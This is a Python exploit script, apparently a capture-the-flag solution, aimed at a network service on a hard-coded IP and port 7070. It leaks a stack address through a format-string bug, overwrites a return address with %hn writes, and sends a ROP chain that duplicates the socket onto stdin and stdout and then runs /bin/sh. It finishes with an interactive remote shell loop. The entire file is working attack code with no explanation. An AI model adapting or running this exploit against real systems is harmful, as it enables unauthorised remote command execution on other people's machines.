#!/usr/bin/env python
from struct import *
import sys
import socket
import time

argvs   = sys.argv
rhp     = (argvs[1] if len(argvs)>1 else "88.87.208.163", 7070)
sh      = "/bin/sh"

offset_ret      = 0x1feec
offset_start    = 0x1ff0c
offset_sh       = 0x1ff30
offset_payload  = 0x1ff4c

addr_popx5c     = 0x080517a3
addr_push_a     = 0x08077b58
addr_add_a      = 0x080cf350    #add eax, 0x2250e43
addr_pop_a      = 0x080ced61
addr_pop_dcb    = 0x08060a7c
addr_pop_cb     = 0x08060a7d
addr_inc_c      = 0x080c7a5c
addr_syscall    = 0x08061240

out_len = lambda x: "%6$"+str(x if x>0 else 0x10000+x)+"x" if x!=0 else ""

#==============================

nc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
nc.settimeout(5.0)
nc.connect(rhp)

sys.stdout.write("Connected to %s : %d\n\n" % rhp)

nc.recv(256)

nc.sendall("0x%60$08x\x0a")
base_stack  = int(nc.recv(256)[:-1].split()[3],16) - 0x1fffc

addr_ret    = base_stack + offset_ret
addr_start  = base_stack + offset_start
addr_sh     = base_stack + offset_sh
addr_payload= base_stack + offset_payload

sys.stdout.write("[+]base_addr_stack    = 0x%08x\n"%base_stack)
sys.stdout.write("[+]addr_syscall       = 0x%08x\n"%addr_syscall)
sys.stdout.write("="*0x20+"\n\n")

#==============================
nc.recv(256)

exploit  = pack("<I",addr_ret)
exploit += pack("<I",addr_ret+0x02)

exploit += out_len((addr_popx5c>>0x10)-0x8)
exploit += "%7$hn"
exploit += out_len((addr_popx5c&0xffff)-(addr_popx5c>>0x10))
exploit += "%6$hn"

exploit += "\x00"*(addr_sh-addr_start-len(exploit))
exploit += sh
exploit += "\x00"*(0x10-len(sh))
exploit += pack("<I",addr_sh)
exploit += "\x00"*(addr_payload-addr_start-len(exploit))

nc.sendall(exploit)


#payload
#dup2
payload  = pack("<I",addr_pop_a)
payload += pack("<I",addr_pop_cb - 0x2250e43)
payload += pack("<I",addr_add_a)
payload += pack("<I",addr_push_a)
payload += pack("<I",0x0)
payload += pack("<I",0x4)
payload += pack("<I",addr_pop_a)
payload += pack("<I",0x3f)
payload += pack("<I",addr_syscall)

payload += pack("<I",addr_inc_c)
payload += pack("<I",addr_pop_a)
payload += pack("<I",0x3f)
payload += pack("<I",addr_syscall)

payload += pack("<I",addr_inc_c)
payload += pack("<I",addr_pop_a)
payload += pack("<I",0x3f)
payload += pack("<I",addr_syscall)

#exec("/bin/sh",["/bin/sh",NULL],NULL)
payload += pack("<I",addr_pop_a)
payload += pack("<I",addr_pop_dcb - 0x2250e43)
payload += pack("<I",addr_add_a)
payload += pack("<I",addr_push_a)
payload += pack("<I",0x0)
payload += pack("<I",addr_sh+0x10)
payload += pack("<I",addr_sh)
payload += pack("<I",addr_pop_a)
payload += pack("<I",0x0b)
payload += pack("<I",addr_syscall)

nc.sendall(payload+"\x0a")

time.sleep(1.0)
rsp = ""
while len(rsp)%1024==0:
    rsp += nc.recv(1024)

#==============================

cmd=""
while 1:
    cmd = raw_input("$")
    if len(cmd)>0:
        nc.sendall(cmd + "\x0a")

    if cmd!="exit":
        rsp = ""
        try:
            while len(rsp)%1024==0:
                rsp += nc.recv(1024)
        except:
            rsp += "Response Timeout"
        finally:
            print rsp
    else:
        break

nc.close()

#==============================
